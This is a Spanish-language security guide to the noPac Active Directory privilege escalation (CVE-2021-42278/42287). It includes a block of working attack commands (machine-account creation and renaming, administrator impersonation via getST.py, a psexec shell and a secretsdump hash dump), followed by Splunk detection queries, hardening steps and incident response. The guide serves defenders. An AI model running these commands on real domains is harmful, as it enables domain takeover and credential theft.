# 🛑 noPac en Active Directory

---

## 📝 ¿Qué es noPac?

| Concepto      | Descripción                                                                                                      |
|---------------|-----------------------------------------------------------------------------------------------------------------|
| **Definición**| Combinación de dos fallos (CVE-2021-42278 y CVE-2021-42287) que permite a cualquier usuario del dominio crear y manipular cuentas de máquina para suplantar a un DC y obtener privilegios de administrador. |
| **Requisito** | MachineAccountQuota > 0 (por defecto 10) y DCs sin parches críticos de noviembre/diciembre 2021 o posteriores.    |

---

## 🛠️ ¿Cómo funciona el ataque?

| Fase                | Acción                                                                                                 |
|---------------------|--------------------------------------------------------------------------------------------------------|
| **Creación**        | El atacante, con una cuenta cualquiera, crea una cuenta de máquina nueva en el dominio.                |
| **Manipulación**    | Cambia el nombre/SAMAccountName de la máquina para imitar un DC, o modifica una existente poco vigilada.|
| **Ticket Kerberos** | Solicita TGT/TGS como esa máquina, engañando al KDC y obteniendo privilegios de administrador de dominio. |
| **Explotación**     | Usa el ticket para ejecutar comandos como SYSTEM, abrir shells remotas y extraer hashes desde el DC.    |
| **Limpieza**        | Borra la cuenta de máquina para eliminar huellas.                                                      |

---

## 💻 Ejemplo práctico ofensivo (comandos reales)

```bash
# Crear cuenta de máquina y cambiar atributos (nombre de DC)
python3 nopac.py --action addcomputer --computer-name FAKE-DC$ --computer-pass 'Password123!'
python3 nopac.py --action modcomputer --computer-name FAKE-DC$ --newname DC01$

# O modificar una cuenta de máquina existente ya creada:
python3 nopac.py --action modcomputer --computer-name EXISTENTE$ --newname DC01$

# Solicitar TGT como DC comprometido
getST.py -dc-ip 192.168.1.10 ESSOS.LOCAL/DC01\$ -impersonate administrator

# Obtener shell como SYSTEM directamente en el DC
psexec.py -k -no-pass ESSOS.LOCAL/administrator@dc01.essos.local

# Volcar hashes de todo el dominio
secretsdump.py -k -no-pass ESSOS.LOCAL/administrator@dc01.essos.local

# Muchos scripts permiten --dump, --shell, etc., para automatizar el proceso
```

---

## 📊 Detección en Splunk

| Evento clave | Descripción                                                                              |
|--------------|-----------------------------------------------------------------------------------------|
| **4741**     | Creación de cuenta de máquina (MachineAccountQuota abuse/noPac)                         |
| **4742**     | Modificación de cuenta de máquina (nombre, contraseña, atributos)                       |
| **4743**     | Borrado de cuenta de máquina (limpieza)                                                 |
| **4768/4769**| Solicitud de TGT/TGS Kerberos con la cuenta comprometida (suplantación, abuso tickets)  |
| **4624**     | Inicio de sesión (tipo 3/red) usando la máquina falsa                                   |
| **7045**     | Creación de servicio remoto (psexec/smbexec, shell persistente)                         |
| **5140**     | Acceso a recursos compartidos (ADMIN$, SYSVOL)                                          |
| **4662**     | Cambios en objetos críticos de AD (delegaciones, atributos avanzados)                   |
| **4738**     | Cambios en cuentas de usuario (si se toca una cuenta de máquina ya existente)           |

### Query Splunk básica

```splunk
index=dc_logs (EventCode=4741 OR EventCode=4742 OR EventCode=4743 OR EventCode=4768 OR EventCode=4769 OR EventCode=4624 OR EventCode=7045 OR EventCode=5140 OR EventCode=4662 OR EventCode=4738)
| sort _time
| table _time, EventCode, TargetAccountName, SubjectAccountName, host, Client_Address
```

### Cambios en cuentas de máquina existentes

```splunk
index=dc_logs EventCode=4742
| search AttributeName="sAMAccountName" OR AttributeName="servicePrincipalName" OR AttributeName="userAccountControl"
| table _time, TargetAccountName, SubjectAccountName, AttributeName, OldValue, NewValue, host
```

### Detección de shell/dump vía creación de servicio y acceso a NTDS.dit

```splunk
index=dc_logs (EventCode=7045 OR EventCode=5140)
| search (ServiceFileName="*cmd.exe*" OR ServiceFileName="*powershell.exe*" OR Object_Name="*NTDS.dit*")
| table _time, EventCode, ServiceFileName, Object_Name, SubjectAccountName, host
```

---

## 🦾 Hardening y mitigación

| Medida                                  | Descripción                                                                                      |
|------------------------------------------|-------------------------------------------------------------------------------------------------|
| **MachineAccountQuota = 0**              | Solo los administradores pueden crear cuentas de máquina.                                        |
| **Parchear DCs**                         | Aplica todas las actualizaciones acumulativas desde nov/dic 2021 (CVE-2021-42278 y 42287).       |
| **Alerta por secuencia completa**        | No solo un evento: correlaciona creación, modificación y uso de cuentas de máquina.              |
| **Honeytokens de máquina**               | Crea cuentas de máquina trampa y alerta si se usan.                                              |
| **Monitoriza cambios en cuentas existentes** | Detecta 4742 sobre cuentas de máquina antiguas o poco usadas.                                   |
| **Auditoría avanzada y logs grandes**    | Habilita directivas de auditoría avanzada y sube el tamaño del log de seguridad.                 |
| **Permisos de delegación restringidos**  | No uses “Permitir delegación a cualquier servicio”. Segmenta y revisa delegaciones periódicamente.|
| **Monitoriza cambios en msDS-AllowedToActOnBehalfOfOtherIdentity** | Detección avanzada de persistencia oculta.                                     |
| **Auditoría de scripts y binarios en ADMIN$** | Alerta si aparece un ejecutable no estándar en recursos compartidos administrativos.             |
| **Restricción temporal**                 | Alerta si un 4742 ocurre fuera de horario laboral.                                               |

---

## 🚨 Respuesta ante incidentes

1. **Aísla inmediatamente cualquier máquina donde veas la secuencia 4742 (sobre cuenta antigua) + 7045/5140.**
2. **Revoca tickets Kerberos** y resetea la contraseña de la cuenta de máquina afectada.
3. **Forense de servicios creados y binarios ejecutados en las últimas horas.**
4. **Analiza cambios de atributos en cuentas de máquina en logs históricos (búsqueda retroactiva).**
5. **Despliega reglas de detección en tiempo real para cambios de atributos clave.**

---

## 📚 Referencias

- [noPac - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privilege-escalation/nopac)
- [Microsoft Security Update Guide](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
- [Impacket](https://github.com/fortra/impacket)

